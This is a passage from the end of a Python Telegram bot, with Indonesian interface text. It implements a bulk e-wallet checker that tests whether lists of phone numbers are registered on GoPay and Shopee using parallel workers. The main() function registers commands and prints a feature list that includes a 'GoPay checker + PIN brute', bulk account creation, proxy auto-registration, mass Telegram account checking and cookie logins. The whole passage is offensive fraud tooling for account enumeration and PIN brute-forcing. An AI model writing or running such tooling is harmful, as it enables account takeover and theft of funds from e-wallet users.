        raw_text = re.sub(r'^/ewallet\s*', '', raw_text, flags=re.IGNORECASE).strip()

        if not raw_text:
            await msg.reply_text(
                _screen('E-WALLET CHECKER', (
                    f"{em(E5,'\U0001f4b3')} <b>E-WALLET CHECKER</b>\n"
                    f"<i>GoPay + Shopee dalam 1 command</i>\n\n"
                    f"Check apakah nomor terdaftar di GoPay dan/atau Shopee.\n\n"
                    f"<b>Cara pakai:</b>\n"
                    f"  \u2022 <code>/ewallet 6285825306013</code>\n"
                    f"  \u2022 <code>/ewallet 628xx 628yy 628zz</code>\n"
                    f"  \u2022 Reply file <code>.txt</code> dengan <code>/ewallet</code>\n\n"
                    f"<b>Output:</b>\n"
                    f"  {em(E1,'\u2705')} <b>Terdaftar</b> \u2014 Nomor + App (GoPay/Shopee)\n"
                    f"  {em(E2,'\u274c')} <b>Tidak Terdaftar</b> \u2014 Bukan user keduanya\n\n"
                    f"<b>Fitur:</b>\n"
                    f"  {em(E6,'\U0001f680')} {EWALLET_MAX_WORKERS} worker paralel\n"
                    f"  {em(CE_FILE,'\U0001f4c1')} Auto export .txt jika >10 nomor\n"
                    f"  {em(CE_NOMOR,'\U0001f4de')} Check 2 platform sekaligus\n\n"
                    f"{em(CE_WAKTU,'\u23f2')} <i>Format: 628xxx / +628xxx / 08xxx</i>"
                ), 'Home \u203a E-Wallet'),
                parse_mode=ParseMode.HTML,
            )
            return

        raw_numbers = re.split(r'[\s,;|\n]+', raw_text)
        phones = []
        for raw in raw_numbers:
            if not raw.strip():
                continue
            cleaned = _shopee_normalize_phone(raw)
            if 8 <= len(cleaned) <= 14:
                phones.append(cleaned)
            else:
                invalid.append(raw)

    if not phones:
        await msg.reply_text(
            _screen('E-WALLET CHECKER', (
                f"{em(E2,'\u274c')} <b>Tidak ada nomor valid!</b>\n\n"
                f"Contoh: <code>/ewallet 6285825306013</code>"
            ), 'Home \u203a E-Wallet'),
            parse_mode=ParseMode.HTML,
        )
        return

    phones = list(dict.fromkeys(phones))

    EWALLET_USER_LIMIT = 50
    if user_id != USER_ID and len(phones) > EWALLET_USER_LIMIT:
        phones = phones[:EWALLET_USER_LIMIT]

    est = max(5, int(len(phones) / EWALLET_MAX_WORKERS * 6))

    progress_msg = await msg.reply_text(
        _screen('E-WALLET CHECKER', (
            f"{em(CE_LOADING,'\U0001f504')} <b>Memulai {len(phones)} nomor ({EWALLET_MAX_WORKERS} workers)...</b>\n\n"
            f"  {em(CE_NOMOR,'\U0001f4de')} <b>Total:</b>  {len(phones)}\n"
            f"  {em(E6,'\U0001f680')} <b>Workers:</b>  {EWALLET_MAX_WORKERS}\n"
            f"  \U0001f4b3 <b>Platform:</b>  GoPay + Shopee\n\n"
            f"{em(CE_WAKTU,'\u23f2')} <i>Estimasi: ~{est} detik</i>"
        ), 'Home \u203a E-Wallet \u203a Processing'),
        parse_mode=ParseMode.HTML,
    )

    asyncio.create_task(_ewallet_process_batch(phones, user_id, progress_msg, context))


async def telegram_error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Log the error and handle specific network/timeout issues gracefully."""
    import httpx
    import telegram
    error = context.error
    if isinstance(error, (telegram.error.TimedOut, telegram.error.NetworkError, httpx.ConnectTimeout, httpx.TimeoutException)):
        print(f"[NETWORK WARNING] Telegram API Connection Timeout/Error: {error}")
        return
    logger.error(msg="Exception while handling an update:", exc_info=context.error)


def main():
    global request_queue
    print("\n" + "=" * 60)
    print(" IVAS PREMIUM BOT - FINAL VERSION")
    print("=" * 60)
    print("📁 Database: OK")
    print(f" Background Workers: 10")
    print("=" * 60)
    request_queue = RequestQueue(max_workers=4, max_queue_size=20)

    # HTTPXRequest dengan timeout besar untuk hindari ConnectTimeout saat bootstrap
    request_obj = HTTPXRequest(
        connection_pool_size=256,
        connect_timeout=30.0,
        read_timeout=30.0,
        write_timeout=30.0,
        pool_timeout=10.0,
    )
    get_updates_request_obj = HTTPXRequest(
        connection_pool_size=256,
        connect_timeout=30.0,
        read_timeout=40.0,
        write_timeout=30.0,
        pool_timeout=10.0,
    )

    # Boot sender userbots saat app siap
    async def _post_init(application):
        try:
            await _start_all_sender_userbots()
        except Exception as e:
            print(f"[USERBOT] Boot error: {e}")

    app = (
        Application.builder()
        .token(TELEGRAM_BOT_TOKEN)
        .request(request_obj)
        .get_updates_request(get_updates_request_obj)
        .concurrent_updates(True)
        .post_init(_post_init)
        .build()
    )
    
    app.add_error_handler(telegram_error_handler)
    
    
    app.add_handler(CommandHandler("help", maintenance_guard(help_command)))
    app.add_handler(CommandHandler("fav", maintenance_guard(fav_command)))
    app.add_handler(CommandHandler("start", maintenance_guard(start_command)))
    app.add_handler(CommandHandler("cookies", maintenance_guard(cookies_command)))
    app.add_handler(CommandHandler("bulk", maintenance_guard(bulk_command)))
    app.add_handler(CommandHandler("addrange", maintenance_guard(add_range_command)))
    app.add_handler(CommandHandler("all", maintenance_guard(all_command)))
    app.add_handler(CommandHandler("add", maintenance_guard(add_command)))
    app.add_handler(CommandHandler("bc", bc_command))
    app.add_handler(CommandHandler("mt", mt_command))
    app.add_handler(CommandHandler("logout", maintenance_guard(logout_command)))
    app.add_handler(CommandHandler("top", maintenance_guard(top_command)))
    app.add_handler(CommandHandler("live", maintenance_guard(live_command)))
    app.add_handler(CommandHandler("nomor", maintenance_guard(nomor_command)))
    app.add_handler(CommandHandler("adduser", maintenance_guard(adduser_command)))
    app.add_handler(CommandHandler("listuser", maintenance_guard(listuser_command)))
    app.add_handler(CommandHandler("deluser", maintenance_guard(deluser_command)))
    app.add_handler(CommandHandler("addadmin", addadmin_command))
    app.add_handler(CommandHandler("deladmin", deladmin_command))
    app.add_handler(CommandHandler("ban", ban_command))
    app.add_handler(CommandHandler("unban", unban_command))
    app.add_handler(CommandHandler("akun", maintenance_guard(accounts_command)))
    app.add_handler(CommandHandler("notif", maintenance_guard(notif_command)))
    app.add_handler(CommandHandler("stopnotif", maintenance_guard(stop_notif_command)))
    app.add_handler(CommandHandler("switch", maintenance_guard(switch_command)))
    app.add_handler(CommandHandler("unswitch", maintenance_guard(unswitch_command)))
    app.add_handler(CommandHandler("stats", maintenance_guard(stats_command)))
    app.add_handler(CommandHandler("line", maintenance_guard(line_command)))
    app.add_handler(CommandHandler("fix", fix_command))
    app.add_handler(CommandHandler("create", maintenance_guard(create_command)))
    app.add_handler(CommandHandler("proxy", maintenance_guard(proxy_command)))
    app.add_handler(CommandHandler("myproxy", maintenance_guard(myproxy_command)))
    app.add_handler(CommandHandler("set", set_command))
    app.add_handler(CommandHandler("reset", reset_command))
    app.add_handler(CommandHandler("preview", preview_command))
    app.add_handler(CommandHandler("clear", clear_command))
    app.add_handler(CommandHandler("show", show_command))
    app.add_handler(CommandHandler("check", maintenance_guard(tgcheck_command)))
    app.add_handler(CommandHandler("gopay", maintenance_guard(gopay_command)))
    app.add_handler(CommandHandler("shopee", maintenance_guard(shopee_command)))
    app.add_handler(CommandHandler("ewallet", maintenance_guard(ewallet_command)))
    app.add_handler(CommandHandler("addsender", addsender_command))
    app.add_handler(CommandHandler("sender", sender_command))
    app.add_handler(CommandHandler("cancelsender", cancelsender_command))
    app.add_handler(CommandHandler("sessions", sessions_command))
    app.add_handler(CommandHandler("session", session_detail_command))
    # WA Business Login via ADB (/login)
  #  try:
      #  from wa_login_bot import login_command
      #  app.add_handler(CommandHandler("login", maintenance_guard(login_command)))
      #  print("   • /login - WA Business 3-Layer ADB Login")
   # except ImportError as _e:
   #     print(f"⚠️  /login disabled (wa_login_bot.py not found): {_e}")
    # Document handler khusus LINE EXTRACTOR (hanya aktif saat user dalam mode line_waiting_file)
    app.add_handler(MessageHandler(filters.Document.ALL, maintenance_guard(handle_line_document)))
    
    # Background Job untuk Keep-Alive (5 menit)
    if app.job_queue:
        app.job_queue.run_repeating(keep_alive_task, interval=300, first=10)
        # Background Job untuk Live SMS Monitor (15 detik)
        app.job_queue.run_repeating(notif_monitor_task, interval=MONITOR_INTERVAL, first=5)
        # Background Job untuk SMS AKTIF
        app.job_queue.run_repeating(sms_aktif_task, interval=SMS_AKTIF_INTERVAL, first=8)
        print("✅ Background JobQueue: AKTIF")
        print("📁 Auto-Refresh: Semua akun di DB (Setiap 5 menit)")
        print(f"📁 Live Monitor: {MONITOR_INTERVAL} detik")
        print(f"📨 SMS AKTIF: {SMS_AKTIF_INTERVAL} detik (multi-app fetch, user bot forwarding)")
    else:
        print("❌ Background JobQueue: TIDAK AKTIF (Instalasi gagal?)")

    # Daemon refresh sender Site.pro (tiap 10 menit) biar PHPSESSID tidak mati
    try:
        _refresh_thread = threading.Thread(
            target=_sitepro_refresh_daemon, daemon=True, name="sitepro-refresh",
        )
        _refresh_thread.start()
        print(f"♻️  Sitepro sender refresh: tiap {SENDER_REFRESH_SECS // 60} menit (cooldown {SENDER_COOLDOWN_SECS // 60} menit)")
    except Exception as _e:
        print(f"❌ Gagal start refresh daemon: {_e}")

    
    
    app.add_handler(CallbackQueryHandler(maintenance_guard(menu_callback)))
    
    
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, maintenance_guard(handle_message)))
    
    print(" FITUR READY:")
    print("   • /start - Menu utama dengan profile")
    print("   • /cookies - Login dengan cookies (ambil nama, email, negara, telp)")
    print("   • /bulk - Hapus semua nomor")
    print("   • /add - Tambah 1 nomor (auto bulk jika penuh)")
    print("   • /top - Negara paling aktif")
    print("   • /nomor - Export nomor (Excel/TXT)")
    print("   • /akun - Pengelola banyak akun (Multi-Account)")
    print("   • /line - Line Extractor (potong baris dari .txt)")
    print("   • /fix - Kirim WA unban request via Site.pro")
    print("   • /unban - WA unban 5 sender otomatis (owner only)")
    print("   • /create - Bulk buat akun Site.pro")
    print("   • /proxy - OwlProxy auto-register (free SOCKS5/HTTP proxy)")
    print("   • /check - Cek akun Telegram (20 worker, file .txt)")
    print("   • /gopay - GoPay checker + PIN brute (20 worker, file .txt)")
    print("   • /shopee - Shopee registration checker (15 worker, file .txt)")
    print("   • /ewallet - Combined GoPay + Shopee checker")
    print("   • 🤖 /fix userbot di Saved Messages sender")
    print("=" * 60)
    print(" Bot running... (Press Ctrl+C to stop)")
    print("=" * 60)

    # Retry loop saat startup jika koneksi ke api.telegram.org timeout
    boot_attempt = 0
    while True:
        boot_attempt += 1
        try:
            app.run_polling(
                drop_pending_updates=True,
                timeout=30,
                bootstrap_retries=-1,  # retry tak terbatas saat bootstrap
            )
            break
        except (TimedOut, NetworkError) as e:
            wait = min(60, 5 * boot_attempt)
            print(f"⚠️  Network error saat bootstrap (attempt {boot_attempt}): {e}. Retry dalam {wait}s...")
            time.sleep(wait)
        except KeyboardInterrupt:
            print("\n👋 Bot dihentikan")
            break
        except Exception as e:
            # Untuk error lain, coba lagi beberapa kali sebelum menyerah
            wait = min(60, 5 * boot_attempt)
            print(f"⚠️  Startup error (attempt {boot_attempt}): {e}. Retry dalam {wait}s...")
            if boot_attempt >= 10:
                print("❌ Gagal start bot setelah 10x percobaan. Periksa koneksi/proxy/token.")
                raise
            time.sleep(wait)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n👋 Bot dihentikan")
    except Exception as e:
        print(f"\n Error: {e}")
